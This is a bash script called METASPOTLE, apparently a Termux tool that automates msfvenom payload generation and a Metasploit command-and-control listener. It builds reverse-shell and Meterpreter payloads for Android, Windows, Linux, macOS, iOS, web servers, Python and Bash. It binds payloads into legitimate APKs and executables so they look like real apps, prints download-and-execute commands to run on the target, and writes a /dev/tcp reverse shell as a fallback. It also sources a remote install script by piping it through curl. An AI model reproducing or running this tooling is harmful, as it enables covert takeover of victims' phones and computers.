#!/bin/bash

#===============================================================================
# METASPOTLE - Advanced Payload Generator & C2 Listener for Termux
# Author: HackerAI
# Description: Automated msfvenom payload generator + multi-handler listener
# Compatibility: Termux (Android) with Metasploit Framework installed
#===============================================================================

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# Banner
banner() {
  clear
  echo -e "${RED}"
  echo '    __  ___      __            __    __        __       '
  echo '   /  |/  /___  / /____  _____/ /___/ /___  __/ /____ _ '
  echo '  / /|_/ / __ \/ __/ _ \/ ___/ / __  / __ \/ / __/ _ \ '
  echo ' / /  / / /_/ / /_/  __/ /  / / /_/ / /_/ / / /_/  __/ '
  echo '/_/  /_/\____/\__/\___/_/  /_/\__,_/\____/_/\__/\___/  '
  echo -e "${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}        Advanced Payload Generator & C2 Framework${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo ""
}

# Check dependencies
check_deps() {
  if ! command -v msfvenom &>/dev/null; then
    echo -e "${RED}[!] Metasploit Framework not found!${NC}"
    echo -e "${YELLOW}[*] Install it first:${NC}"
    echo -e "  ${BOLD}pkg install curl -y${NC}"
    echo -e "  ${BOLD}source <(curl -fsSL https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh)${NC}"
    echo ""
    read -p "Press [Enter] to exit..."
    exit 1
  fi
}

# Check if session tracking files exist
init_tracker() {
  mkdir -p $HOME/.metaspotle
  SESSION_FILE="$HOME/.metaspotle/sessions.log"
  PAYLOAD_DIR="$HOME/metaspotle_payloads"
  mkdir -p "$PAYLOAD_DIR"
  touch "$SESSION_FILE"
}

# Get local IP
get_ip() {
  IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  if [ -z "$IP" ]; then
    IP=$(ifconfig 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  fi
  if [ -z "$IP" ]; then
    IP=$(hostname -I 2>/dev/null | awk '{print $1}')
  fi
  if [ -z "$IP" ]; then
    IP="127.0.0.1"
  fi
  echo "$IP"
}

#==============[ MAIN MENU ]==============

main_menu() {
  while true; do
    banner
    echo -e "${YELLOW}        ╔══════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}        ║         ${WHITE}MAIN CONTROL PANEL${YELLOW}          ║${NC}"
    echo -e "${YELLOW}        ╚══════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}  [1]${WHITE}  Generate Payload${NC}"
    echo -e "${GREEN}  [2]${WHITE}  Start Listener (Multi-Handler)${NC}"
    echo -e "${GREEN}  [3]${WHITE}  List Generated Payloads${NC}"
    echo -e "${GREEN}  [4]${WHITE}  View Session History${NC}"
    echo -e "${GREEN}  [5]${WHITE}  Clean Payloads${NC}"
    echo -e "${RED}  [0]${WHITE}  Exit${NC}"
    echo ""
    read -p "$(echo -e ${CYAN}"[>] Select option: "${NC})" main_choice

    case $main_choice in
      1) payload_generator ;;
      2) start_listener ;;
      3) list_payloads ;;
      4) view_sessions ;;
      5) clean_payloads ;;
      0)
        echo -e "\n${GREEN}[+] Exiting... Stay safe!${NC}"
        exit 0
        ;;
      *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
    esac
  done
}

#==============[ PAYLOAD GENERATOR ]==============

payload_generator() {
  clear
  banner
  
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}PAYLOAD GENERATOR ENGINE${CYAN}            ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""

  # Get LHOST
  default_ip=$(get_ip)
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 1: Enter LHOST (Listener IP)${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo -e "${YELLOW}  [i] Your local IP appears to be: ${WHITE}$default_ip${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST: "${NC})" LHOST
  LHOST=${LHOST:-$default_ip}
  echo ""

  # Get LPORT
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 2: Enter LPORT (Listener Port)${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo -e "${YELLOW}  [i] Recommended: 4444, 8080, 1337${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT: "${NC})" LPORT
  LPORT=${LPORT:-4444}
  echo ""

  # Select payload
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 3: Select Target Platform${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo ""
  echo -e "  ${GREEN}[1]${NC}  Android Payload  (.apk)"
  echo -e "  ${GREEN}[2]${NC}  Windows Payload  (.exe)"
  echo -e "  ${GREEN}[3]${NC}  Linux Payload    (.elf)"
  echo -e "  ${GREEN}[4]${NC}  macOS Payload    (.macho)"
  echo -e "  ${GREEN}[5]${NC}  iPhone/iOS Payload (.macho)"
  echo -e "  ${GREEN}[6]${NC}  Web Payloads     (PHP/ASP/JSP)"
  echo -e "  ${GREEN}[7]${NC}  Python Payload   (.py)"
  echo -e "  ${GREEN}[8]${NC}  Bash Payload     (.sh)"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Select platform [1-8]: "${NC})" plat_choice

  case $plat_choice in
    1) generate_android ;;
    2) generate_windows ;;
    3) generate_linux ;;
    4) generate_macos ;;
    5) generate_iphone ;;
    6) generate_web ;;
    7) generate_python ;;
    8) generate_bash ;;
    *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; return ;;
  esac
}

#======================[ GENERATORS ]======================

generate_android() {
  clear
  banner
  echo -e "${MAGENTA}[*] Generating Android Payload...${NC}"
  
  FILENAME="android_payload_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  # Ask for icon binding option
  echo -e "${YELLOW}[?] Bind payload to a legitimate APK? (y/n)${NC}"
  echo -e "  ${DIM}This makes the payload look like a real app${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" bind_choice
  
  if [[ "$bind_choice" == "y" || "$bind_choice" == "Y" ]]; then
    echo -e "${YELLOW}[?] Enter path to legitimate APK file:${NC}"
    read -p "$(echo -e ${CYAN}"[>] Path: "${NC})" TEMPLATE_APK
    if [ -f "$TEMPLATE_APK" ]; then
      echo -e "${GREEN}[+] Binding payload to $TEMPLATE_APK...${NC}"
      msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$OUTPUT" &>/dev/null
    else
      echo -e "${RED}[!] File not found. Generating standalone APK...${NC}"
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
    fi
  else
    echo -e "${YELLOW}[*] Generating with default icon...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Copy command for transfer:${NC}"
    echo -e "${YELLOW}  cp $OUTPUT /sdcard/Download/${NC}"
    echo ""
    echo -e "${BOLD}Or use HTTP server to share:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  Then visit: http://$LHOST:8888/$FILENAME${NC}"
    echo ""
    echo -e "${BOLD}Direct install command (Termux):${NC}"
    echo -e "${YELLOW}  cp $OUTPUT /sdcard/ && echo 'APK copied to internal storage'${NC}"
    echo ""
    
    # Sign the APK automatically (if jarsigner is available)
    if command -v jarsigner &>/dev/null && [ -f "$HOME/.android/debug.keystore" ]; then
      echo -e "${YELLOW}[*] Signing APK...${NC}"
      jarsigner -keystore $HOME/.android/debug.keystore -storepass android -keypass android "$OUTPUT" androiddebugkey &>/dev/null
      echo -e "${GREEN}[OK] APK signed${NC}"
    else
      echo -e "${YELLOW}[!] APK not signed. Use apksigner or enable install from unknown sources.${NC}"
    fi
    
    # Log the payload
    echo "[$(date)] ANDROID | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
    echo -e "${YELLOW}[!] Make sure LHOST=$LHOST is reachable${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_windows() {
  clear
  banner
  echo -e "${BLUE}[*] Generating Windows Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (32-bit)"
  echo -e "  ${GREEN}[2]${NC} x64 (64-bit)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  echo -e "${YELLOW}[?] Payload type:${NC}"
  echo -e "  ${GREEN}[1]${NC} Meterpreter Reverse TCP (Staged)"
  echo -e "  ${GREEN}[2]${NC} Shell Reverse TCP (Stageless)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" type
  
  if [ "$arch" == "2" ]; then
    ARCH_PAYLOAD="windows/x64"
  else
    ARCH_PAYLOAD="windows"
  fi
  
  if [ "$type" == "2" ]; then
    PAYLOAD_TYPE="shell_reverse_tcp"
  else
    PAYLOAD_TYPE="meterpreter/reverse_tcp"
  fi
  
  FILENAME="windows_payload_$(date +%s).exe"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  echo -e "${YELLOW}[?] Use template executable? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" template_q
  
  if [[ "$template_q" == "y" ]]; then
    echo -e "${YELLOW}[?] Enter path to .exe template:${NC}"
    read -p "$(echo -e ${CYAN}"[>] Path: "${NC})" TEMPLATE_EXE
    if [ -f "$TEMPLATE_EXE" ]; then
      msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -x "$TEMPLATE_EXE" -k -f exe -o "$OUTPUT" 2>/dev/null
    else
      echo -e "${RED}[!] Template not found. Generating without...${NC}"
      msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
    fi
  else
    msfvenom -p ${ARCH_PAYLOAD}/${PAYLOAD_TYPE} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer command:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  Then download: http://$LHOST:8888/$FILENAME${NC}"
    echo ""
    echo -e "${BOLD}Or use curl on target:${NC}"
    echo -e "${YELLOW}  curl -O http://$LHOST:8888/$FILENAME${NC}"
    echo ""
    echo "[$(date)] WINDOWS | LHOST=$LHOST LPORT=$LPORT | ARCH=${ARCH_PAYLOAD} | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_linux() {
  clear
  banner
  echo -e "${GREEN}[*] Generating Linux Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (32-bit)"
  echo -e "  ${GREEN}[2]${NC} x64 (64-bit)"
  echo -e "  ${GREEN}[3]${NC} ARM (Raspberry Pi/Android)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  case $arch in
    1) payload="linux/x86/meterpreter/reverse_tcp"; ext="elf" ;;
    2) payload="linux/x64/meterpreter/reverse_tcp"; ext="elf" ;;
    3) payload="linux/armle/meterpreter/reverse_tcp"; ext="elf" ;;
    *) payload="linux/x86/meterpreter/reverse_tcp"; ext="elf" ;;
  esac
  
  FILENAME="linux_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer + Execute:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  On target: wget http://$LHOST:8888/$FILENAME && chmod +x $FILENAME && ./$FILENAME${NC}"
    echo ""
    echo "[$(date)] LINUX | LHOST=$LHOST LPORT=$LPORT | ARCH=$arch | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_macos() {
  clear
  banner
  echo -e "${MAGENTA}[*] Generating macOS Payload...${NC}"
  
  echo -e "${YELLOW}[?] Select architecture:${NC}"
  echo -e "  ${GREEN}[1]${NC} x86 (Intel)"
  echo -e "  ${GREEN}[2]${NC} x64 (Intel 64-bit)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  
  if [ "$arch" == "1" ]; then
    payload="osx/x86/shell_reverse_tcp"
  else
    payload="osx/x64/meterpreter/reverse_tcp"
  fi
  
  FILENAME="macos_payload_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] MACOS | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_iphone() {
  clear
  banner
  echo -e "${CYAN}[*] Generating iOS/iPhone Payload...${NC}"
  echo -e "${YELLOW}[!] Note: iOS payloads require jailbroken devices for execution${NC}"
  
  echo -e "${YELLOW}[?] Select payload:${NC}"
  echo -e "  ${GREEN}[1]${NC} iOS Meterpreter Reverse TCP (arm64)"
  echo -e "  ${GREEN}[2]${NC} iOS Shell Reverse TCP (armle)"
  echo -e "  ${GREEN}[3]${NC} iOS Meterpreter Reverse HTTPS (arm64)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ios_type
  
  case $ios_type in
    1) payload="apple_ios/aarch64/meterpreter/reverse_tcp"; ext="macho" ;;
    2) payload="apple_ios/armle/shell_reverse_tcp"; ext="macho" ;;
    3) payload="apple_ios/aarch64/meterpreter/reverse_https"; ext="macho" ;;
    *) payload="apple_ios/aarch64/meterpreter/reverse_tcp"; ext="macho" ;;
  esac
  
  FILENAME="iphone_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Transfer to iPhone via:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo ""
    echo "[$(date)] IOS | LHOST=$LHOST LPORT=$LPORT | TYPE=$ios_type | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
    echo -e "${YELLOW}[!] iOS payloads require Metasploit 6+. Trying alternative...${NC}"
    # Fallback
    msfvenom -p osx/arm64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
    if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
      echo -e "${GREEN}[OK] Fallback payload created${NC}"
    fi
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_web() {
  clear
  banner
  echo -e "${YELLOW}[*] Generating Web Payloads...${NC}"
  
  echo -e "${YELLOW}[?] Select web platform:${NC}"
  echo -e "  ${GREEN}[1]${NC} PHP Reverse Shell"
  echo -e "  ${GREEN}[2]${NC} ASP Reverse Shell"
  echo -e "  ${GREEN}[3]${NC} JSP Reverse Shell"
  echo -e "  ${GREEN}[4]${NC} WAR Reverse Shell (Tomcat)"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" web_type
  
  case $web_type in
    1) payload="php/reverse_php"; ext="php" ;;
    2) payload="windows/meterpreter/reverse_tcp"; ext="asp" ;;
    3) payload="java/jsp_shell_reverse_tcp"; ext="jsp" ;;
    4) payload="java/meterpreter/reverse_tcp"; ext="war" ;;
    *) payload="php/reverse_php"; ext="php" ;;
  esac
  
  FILENAME="web_payload_$(date +%s).$ext"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  if [ "$ext" == "php" ]; then
    msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  else
    msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f $ext -o "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Upload to web server and access the file${NC}"
    echo ""
    echo "[$(date)] WEB | LHOST=$LHOST LPORT=$LPORT | TYPE=$ext | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_python() {
  clear
  banner
  echo -e "${BLUE}[*] Generating Python Payload...${NC}"
  
  FILENAME="python_payload_$(date +%s).py"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Run on target:${NC}"
    echo -e "${YELLOW}  python3 $FILENAME${NC}"
    echo ""
    echo "[$(date)] PYTHON | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

generate_bash() {
  clear
  banner
  echo -e "${GREEN}[*] Generating Bash Reverse Shell...${NC}"
  
  FILENAME="bash_payload_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  # Generate raw bash reverse shell
  msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    chmod +x "$OUTPUT"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Run on target (Linux/Unix):${NC}"
    echo -e "${YELLOW}  bash $FILENAME${NC}"
    echo ""
    echo "[$(date)] BASH | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME" >> "$SESSION_FILE"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
    echo -e "${YELLOW}[!] Creating manual bash reverse shell...${NC}"
    cat > "$OUTPUT" << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
EOF
    # Fix the LHOST/LPORT in manual shell
    sed -i "s/127.0.0.1/$LHOST/g; s/4444/$LPORT/g" "$OUTPUT"
    chmod +x "$OUTPUT"
    echo -e "${GREEN}[OK] Manual bash reverse shell created${NC}"
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo "[$(date)] BASH | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

#==============[ LISTENER ]==============

start_listener() {
  clear
  banner
  
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}COMMAND & CONTROL LISTENER${CYAN}          ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  
  default_ip=$(get_ip)
  
  echo -e "${YELLOW}[?] Enter LHOST (Listener IP):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" L_HOST
  L_HOST=${L_HOST:-$default_ip}
  
  echo -e "${YELLOW}[?] Enter LPORT (Listener Port):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" L_PORT
  L_PORT=${L_PORT:-4444}
  
  echo ""
  echo -e "${YELLOW}[?] Select payload type for handler:${NC}"
  echo -e "  ${GREEN}[1]${NC} android/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[2]${NC} windows/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[3]${NC} linux/x64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[4]${NC} osx/x64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[5]${NC} apple_ios/aarch64/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[6]${NC} php/reverse_php"
  echo -e "  ${GREEN}[7]${NC} python/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[8]${NC} java/meterpreter/reverse_tcp"
  echo -e "  ${GREEN}[9]${NC} Custom / Multi-Platform auto-detect"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Select [1-9]: "${NC})" handler_type
  
  case $handler_type in
    1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
    3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
    4) PAYLOAD="osx/x64/meterpreter/reverse_tcp" ;;
    5) PAYLOAD="apple_ios/aarch64/meterpreter/reverse_tcp" ;;
    6) PAYLOAD="php/reverse_php" ;;
    7) PAYLOAD="python/meterpreter/reverse_tcp" ;;
    8) PAYLOAD="java/meterpreter/reverse_tcp" ;;
    9) 
      echo -e "${YELLOW}[?] Enter custom payload:${NC}"
      read -p "$(echo -e ${CYAN}"[>] "${NC})" PAYLOAD
      PAYLOAD=${PAYLOAD:-"windows/meterpreter/reverse_tcp"}
      ;;
    *) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
  esac
  
  echo ""
  echo -e "${YELLOW}[?] Enable autorun scripts on session? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" autorun
  
  echo ""
  echo -e "${GREEN}[+] Starting listener...${NC}"
  echo -e "${GREEN}[+] LHOST: $L_HOST | LPORT: $L_PORT | Payload: $PAYLOAD${NC}"
  echo ""
  echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  ${WHITE}Listener is running. Waiting for target...${RED}  ║${NC}"
  echo -e "${RED}║  ${YELLOW}Press Ctrl+C to stop listener${RED}           ║${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
  echo ""
  
  # Create resource file for the handler
  RC_FILE="$HOME/.metaspotle/listener_${L_PORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $L_HOST
set LPORT $L_PORT
set ExitOnSession false
set SessionTimeout 0
set AutoRunScript ""
set InitialAutoRunScript ""
set AutoVerifySession true
set AutoSystemInfo true
set EncodeStageless false
set EnableStageEncoding false
set StageEncodingFallback true
set HandleRemotePayload true
set WaitForSession true
EOF
  
  # Add autorun if selected
  if [[ "$autorun" == "y" ]]; then
    cat >> "$RC_FILE" << EOF
set AutoRunScript migrate -f
EOF
  fi
  
  cat >> "$RC_FILE" << EOF
exploit -j -z
EOF

  # Launch msfconsole with the resource script
  echo -e "${GREEN}[*] Launching Metasploit Framework...${NC}"
  echo -e "${YELLOW}[*] Resource file: $RC_FILE${NC}"
  echo -e "${YELLOW}[*] To manually check sessions later, use:${NC}"
  echo -e "${WHITE}    msfconsole -q -x 'sessions -l'${NC}"
  echo ""
  sleep 2
  
  msfconsole -q -r "$RC_FILE"
  
  # After returning from listener
  echo ""
  echo -e "${YELLOW}[*] Listener stopped.${NC}"
  
  # Offer interactive shell
  echo -e "${YELLOW}[?] Open interactive MSF console? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" open_msf
  if [[ "$open_msf" == "y" ]]; then
    echo -e "${GREEN}[*] Opening msfconsole... Type 'exit' to return${NC}"
    msfconsole -q
  fi
  
  read -p "$(echo -e ${DIM}"Press [Enter] to return to main menu...")"
}

#==============[ UTILITY FUNCTIONS ]==============

list_payloads() {
  clear
  banner
  echo -e "${GREEN}[*] Generated Payloads:${NC}"
  echo ""
  
  if [ -d "$PAYLOAD_DIR" ] && [ "$(ls -A $PAYLOAD_DIR 2>/dev/null)" ]; then
    ls -lh "$PAYLOAD_DIR" | tail -n +2
    echo ""
    echo -e "${BOLD}Total payloads: $(ls $PAYLOAD_DIR | wc -l)${NC}"
    echo -e "${BOLD}Total size: $(du -sh $PAYLOAD_DIR | cut -f1)${NC}"
    echo ""
    echo -e "${YELLOW}[*] To serve payloads over HTTP:${NC}"
    echo -e "${WHITE}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
  else
    echo -e "${YELLOW}[!] No payloads generated yet.${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

view_sessions() {
  clear
  banner
  echo -e "${CYAN}[*] Session & Payload History:${NC}"
  echo ""
  
  if [ -f "$SESSION_FILE" ] && [ -s "$SESSION_FILE" ]; then
    cat "$SESSION_FILE"
    echo ""
    echo -e "${BOLD}Total entries: $(wc -l < $SESSION_FILE)${NC}"
  else
    echo -e "${YELLOW}[!] No session history yet.${NC}"
